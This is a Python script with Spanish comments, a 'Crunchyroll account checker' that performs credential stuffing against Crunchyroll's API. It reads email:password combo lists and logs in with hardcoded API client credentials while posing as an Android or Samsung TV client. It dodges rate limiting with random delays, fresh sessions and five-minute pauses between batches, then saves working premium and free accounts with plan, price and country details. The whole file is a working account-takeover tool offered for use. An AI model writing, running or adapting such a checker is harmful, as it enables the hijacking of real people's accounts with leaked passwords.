#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Crunchyroll Checker v2.0
Basado en el script .svb de @PROO_IS_BACK
Con sistema de lotes automático para evitar rate limiting
"""

import requests
import uuid
import urllib.parse
from typing import Dict, Tuple, Optional, List
import time
import random
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class CrunchyrollChecker:
    def __init__(self):
        self.session = None
        # Credenciales de la API de Crunchyroll (del .svb original)
        self.client_id = "ajcylfwdtjjtq7qpgks3"
        self.client_secret = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
        self.reset_session()
    
    def reset_session(self):
        """Reinicia la sesión con headers realistas"""
        self.session = requests.Session()
        
        # Headers basados en el .svb (simula app Android de Crunchyroll)
        self.session.headers.update({
            'User-Agent': 'Crunchyroll/3.83.1 Android/10 okhttp/4.12.0',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
    
    def generate_device_id(self) -> str:
        """Genera un device_id único (UUID)"""
        return str(uuid.uuid4())
    
    def check_account(self, email: str, password: str) -> Tuple[str, Dict]:
        """
        Verifica una cuenta de Crunchyroll
        Retorna: (status, data)
        status: 'PREMIUM', 'FREE', 'INVALID', 'ERROR'
        """
        try:
            # Resetear sesión para cada cuenta
            self.reset_session()
            
            # Delay aleatorio para evitar rate limiting
            time.sleep(random.uniform(1, 3))
            
            # Generar device_id único
            device_id = self.generate_device_id()
            
            # URL encode de credenciales
            username_encoded = urllib.parse.quote(email)
            password_encoded = urllib.parse.quote(password)
            
            # Paso 1: Obtener token de acceso
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            
            token_data = {
                'grant_type': 'password',
                'username': username_encoded,
                'password': password_encoded,
                'scope': 'offline_access',
                'client_id': self.client_id,
                'client_secret': self.client_secret,
                'device_type': 'SamsungTV',
                'device_id': device_id,
                'device_name': 'SamsungTV'
            }
            
            token_headers = {
                'Host': 'beta-api.crunchyroll.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Datadog-Sampling-Priority': '0'
            }
            
            token_response = self.session.post(
                token_url,
                data=token_data,
                headers=token_headers,
                timeout=30
            )
            
            # Verificar si las credenciales son válidas
            if 'invalid_credentials' in token_response.text or \
               'access_token.invalid_credentials' in token_response.text:
                return 'INVALID', {'message': 'Credenciales incorrectas'}
            
            if 'access_token' not in token_response.text:
                return 'INVALID', {'message': 'Login fallido'}
            
            # Extraer tokens
            try:
                token_json = token_response.json()
                access_token = token_json.get('access_token')
                account_id = token_json.get('account_id')
                
                if not access_token:
                    return 'ERROR', {'message': 'No se pudo obtener access_token'}
                
            except Exception as e:
                return 'ERROR', {'message': f'Error al parsear respuesta: {str(e)[:50]}'}
            
            # Paso 2: Obtener información de la cuenta
            account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
            
            account_headers = {
                'Authorization': f'Bearer {access_token}',
                'X-Datadog-Sampling-Priority': '0',
                'Etp-Anonymous-Id': str(uuid.uuid4())
            }
            
            account_response = self.session.get(
                account_url,
                headers=account_headers,
                timeout=30
            )
            
            # Extraer información de la cuenta
            account_info = {}
            try:
                account_json = account_response.json()
                external_id = account_json.get('external_id', '')
                account_info['email_verified'] = account_json.get('email_verified', False)
                account_info['phone'] = account_json.get('phone', '')
            except:
                external_id = ''
            
            if not external_id:
                return 'ERROR', {'message': 'No se pudo obtener external_id'}
            
            # Paso 3: Obtener beneficios de suscripción
            benefits_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
            
            benefits_headers = {
                'Authorization': f'Bearer {access_token}',
                'X-Datadog-Sampling-Priority': '0',
                'Etp-Anonymous-Id': str(uuid.uuid4())
            }
            
            benefits_response = self.session.get(
                benefits_url,
                headers=benefits_headers,
                timeout=30
            )
            
            # Extraer país y plan
            try:
                benefits_json = benefits_response.json()
                account_info['country'] = benefits_json.get('subscription_country', 'Unknown')
                
                # Detectar plan basado en concurrent_streams
                items = benefits_json.get('items', [])
                plan = 'Unknown'
                for item in items:
                    benefit = item.get('benefit', '')
                    if 'concurrent_streams' in benefit:
                        streams = benefit.replace('concurrent_streams.', '')
                        if streams == '1':
                            plan = 'Fan Pack'
                        elif streams == '4':
                            plan = 'Mega Fan Pack'
                        elif streams == '6':
                            plan = 'Ultimate Fan Pack'
                        break
                
                account_info['plan'] = plan
            except:
                account_info['country'] = 'Unknown'
                account_info['plan'] = 'Unknown'
            
            # Paso 4: Obtener productos de suscripción
            products_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
            
            products_headers = {
                'Authorization': f'Bearer {access_token}',
                'X-Datadog-Sampling-Priority': '0',
                'Etp-Anonymous-Id': str(uuid.uuid4())
            }
            
            products_response = self.session.get(
                products_url,
                headers=products_headers,
                timeout=30
            )
            
            # Determinar si es FREE o PREMIUM
            try:
                products_json = products_response.json()
                total_items = products_json.get('total', 0)
                
                if total_items == 0:
                    # Cuenta FREE
                    result = {
                        'email': email,
                        'password': password,
                        'type': 'FREE',
                        'country': account_info.get('country', 'Unknown'),
                        'email_verified': account_info.get('email_verified', False),
                        'phone': account_info.get('phone', ''),
                        'plan': 'Free',
                        'message': 'Cuenta gratuita'
                    }
                    return 'FREE', result
                
                else:
                    # Cuenta PREMIUM
                    items = products_json.get('items', [])
                    
                    # Extraer información de suscripción
                    subscription_info = {}
                    if items:
                        first_item = items[0]
                        subscription_info['free_trial'] = first_item.get('active_free_trial', False)
                        subscription_info['amount'] = first_item.get('amount', '0')
                        subscription_info['currency'] = first_item.get('currency_code', 'USD')
                        
                        # Traducir duración del ciclo
                        cycle_duration = first_item.get('cycle_duration', '')
                        duration_map = {
                            'P1D': 'Daily',
                            'P1W': 'Weekly',
                            'P1M': 'Monthly',
                            'P3M': '3 Months',
                            'P1Y': 'Annual'
                        }
                        subscription_info['billing_cycle'] = duration_map.get(cycle_duration, cycle_duration)
                    
                    result = {
                        'email': email,
                        'password': password,
                        'type': 'PREMIUM',
                        'country': account_info.get('country', 'Unknown'),
                        'email_verified': account_info.get('email_verified', False),
                        'phone': account_info.get('phone', ''),
                        'plan': account_info.get('plan', 'Unknown'),
                        'plan_price': f"{subscription_info.get('amount', '0')}{subscription_info.get('currency', 'USD')}",
                        'billing_cycle': subscription_info.get('billing_cycle', 'Unknown'),
                        'free_trial': subscription_info.get('free_trial', False),
                        'message': 'Cuenta premium'
                    }
                    return 'PREMIUM', result
                    
            except Exception as e:
                return 'ERROR', {'message': f'Error al verificar suscripción: {str(e)[:50]}'}
            
        except requests.exceptions.Timeout:
            return 'ERROR', {'message': 'Timeout'}
        except requests.exceptions.RequestException as e:
            return 'ERROR', {'message': f'Error de red: {str(e)[:50]}'}
        except Exception as e:
            return 'ERROR', {'message': f'Error: {str(e)[:50]}'}


def print_banner():
    """Imprime el banner de la herramienta"""
    banner = f"""
{Fore.MAGENTA}╔═══════════════════════════════════════════════════════╗
║         CRUNCHYROLL ACCOUNT CHECKER v2.0              ║
║              Basado en script de @PROO_IS_BACK        ║
║          Con sistema de lotes automático              ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def load_combo_file(filename: str) -> List[str]:
    """Carga el archivo de combos (email:password)"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return lines
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Archivo no encontrado: {filename}{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error al leer archivo: {e}{Style.RESET_ALL}")
        return []


def split_into_batches(combos: List[str], batch_size: int = 50) -> List[List[str]]:
    """Divide los combos en lotes"""
    batches = []
    for i in range(0, len(combos), batch_size):
        batches.append(combos[i:i + batch_size])
    return batches


def save_result(filename: str, status: str, email: str, password: str, data: Dict):
    """Guarda los resultados en archivos"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if status == 'PREMIUM':
                f.write(f"{email}:{password}\n")
                f.write(f"  Plan: {data.get('plan', 'Unknown')} | ")
                f.write(f"Price: {data.get('plan_price', 'N/A')} | ")
                f.write(f"Cycle: {data.get('billing_cycle', 'N/A')} | ")
                f.write(f"Country: {data.get('country', 'Unknown')}\n")
                if data.get('free_trial'):
                    f.write(f"  ⚠ Free Trial Active\n")
                f.write("\n")
            elif status == 'FREE':
                f.write(f"{email}:{password} | Country: {data.get('country', 'Unknown')}\n")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] No se pudo guardar resultado: {e}{Style.RESET_ALL}")


def countdown_timer(seconds: int, message: str):
    """Muestra un contador regresivo"""
    print(f"\n{Fore.YELLOW}{message}{Style.RESET_ALL}")
    for remaining in range(seconds, 0, -1):
        mins, secs = divmod(remaining, 60)
        timer = f"{mins:02d}:{secs:02d}"
        print(f"{Fore.CYAN}⏳ Esperando: {timer}{Style.RESET_ALL}", end='\r')
        time.sleep(1)
    print(f"{Fore.GREEN}✓ Continuando...{Style.RESET_ALL}" + " " * 30)


def main():
    print_banner()
    
    # Solicitar archivo de combos
    combo_file = input(f"{Fore.YELLOW}[?] Ingresa el nombre del archivo de combos (ej: combos.txt): {Style.RESET_ALL}").strip()
    
    if not combo_file:
        print(f"{Fore.RED}[ERROR] Debes ingresar un archivo de combos{Style.RESET_ALL}")
        return
    
    # Cargar combos
    combos = load_combo_file(combo_file)
    
    if not combos:
        print(f"{Fore.RED}[ERROR] No se pudieron cargar combos del archivo{Style.RESET_ALL}")
        return
    
    # Configuración de lotes
    batch_size = 50
    pause_between_batches = 300  # 5 minutos en segundos
    
    # Dividir en lotes
    batches = split_into_batches(combos, batch_size)
    total_batches = len(batches)
    
    print(f"\n{Fore.CYAN}[INFO] Cargados {len(combos)} combos{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Divididos en {total_batches} lotes de {batch_size} cuentas{Style.RESET_ALL}")
    
    if total_batches > 1:
        print(f"{Fore.YELLOW}[INFO] Habrá pausas de {pause_between_batches // 60} minutos entre lotes{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}[INFO] Iniciando verificación...{Style.RESET_ALL}\n")
    
    # Contadores globales
    global_stats = {
        'premium': 0,
        'free': 0,
        'invalid': 0,
        'errors': 0
    }
    
    checker = CrunchyrollChecker()
    
    # Procesar cada lote
    for batch_num, batch in enumerate(batches, 1):
        # Mostrar información del lote
        print(f"\n{Fore.MAGENTA}{'=' * 60}")
        print(f"  LOTE {batch_num}/{total_batches} - Procesando {len(batch)} cuentas")
        print(f"{'=' * 60}{Style.RESET_ALL}\n")
        
        # Contadores del lote
        batch_stats = {
            'premium': 0,
            'free': 0,
            'invalid': 0,
            'errors': 0
        }
        
        # Procesar cada combo del lote
        for i, combo in enumerate(batch, 1):
            try:
                # Calcular índice global
                global_index = (batch_num - 1) * batch_size + i
                
                # Parsear combo
                if ':' not in combo:
                    print(f"{Fore.RED}[{global_index}/{len(combos)}] Formato inválido: {combo}{Style.RESET_ALL}")
                    continue
                
                parts = combo.split(':', 1)
                if len(parts) != 2:
                    continue
                    
                email, password = parts[0].strip(), parts[1].strip()
                
                if not email or not password:
                    continue
                
                print(f"{Fore.CYAN}[{global_index}/{len(combos)}] Verificando: {email}{Style.RESET_ALL}", end=' ')
                
                # Verificar cuenta
                status, data = checker.check_account(email, password)
                
                if status == 'PREMIUM':
                    batch_stats['premium'] += 1
                    global_stats['premium'] += 1
                    plan_info = f"{data.get('plan', 'Unknown')} | {data.get('plan_price', 'N/A')}"
                    print(f"{Fore.GREEN}★ PREMIUM [{plan_info}]{Style.RESET_ALL}")
                    save_result('premium.txt', status, email, password, data)
                
                elif status == 'FREE':
                    batch_stats['free'] += 1
                    global_stats['free'] += 1
                    country = data.get('country', 'Unknown')
                    print(f"{Fore.YELLOW}◆ FREE [Country: {country}]{Style.RESET_ALL}")
                    save_result('free.txt', status, email, password, data)
                
                elif status == 'INVALID':
                    batch_stats['invalid'] += 1
                    global_stats['invalid'] += 1
                    print(f"{Fore.RED}✗ INVÁLIDA{Style.RESET_ALL}")
                
                else:  # ERROR
                    batch_stats['errors'] += 1
                    global_stats['errors'] += 1
                    print(f"{Fore.YELLOW}⚠ ERROR: {data.get('message', 'Desconocido')}{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}[!] Detenido por el usuario{Style.RESET_ALL}")
                print_final_stats(global_stats)
                return
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {str(e)[:50]}{Style.RESET_ALL}")
                batch_stats['errors'] += 1
                global_stats['errors'] += 1
        
        # Mostrar estadísticas del lote
        print(f"\n{Fore.MAGENTA}[LOTE {batch_num}] Resultados: ")
        print(f"  Premium: {batch_stats['premium']} | Free: {batch_stats['free']} | "
              f"Inválidas: {batch_stats['invalid']} | Errores: {batch_stats['errors']}{Style.RESET_ALL}")
        
        # Pausa entre lotes (excepto en el último)
        if batch_num < total_batches:
            countdown_timer(
                pause_between_batches,
                f"[PAUSA] Esperando {pause_between_batches // 60} minutos antes del siguiente lote..."
            )
    
    # Mostrar estadísticas finales
    print_final_stats(global_stats)


def print_final_stats(stats: Dict):
    """Imprime las estadísticas finales"""
    print(f"\n{Fore.MAGENTA}╔═══════════════════════════════════════════════════════╗")
    print(f"║                  RESULTADOS FINALES                   ║")
    print(f"╠═══════════════════════════════════════════════════════╣")
    print(f"║  {Fore.GREEN}Premium: {stats['premium']:<44}{Fore.MAGENTA}║")
    print(f"║  {Fore.YELLOW}Free: {stats['free']:<47}{Fore.MAGENTA}║")
    print(f"║  {Fore.RED}Inválidas: {stats['invalid']:<42}{Fore.MAGENTA}║")
    print(f"║  {Fore.YELLOW}Errores: {stats['errors']:<44}{Fore.MAGENTA}║")
    print(f"╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    if stats['premium'] > 0:
        print(f"{Fore.GREEN}[★] Cuentas premium guardadas en: premium.txt{Style.RESET_ALL}")
    if stats['free'] > 0:
        print(f"{Fore.YELLOW}[◆] Cuentas free guardadas en: free.txt{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
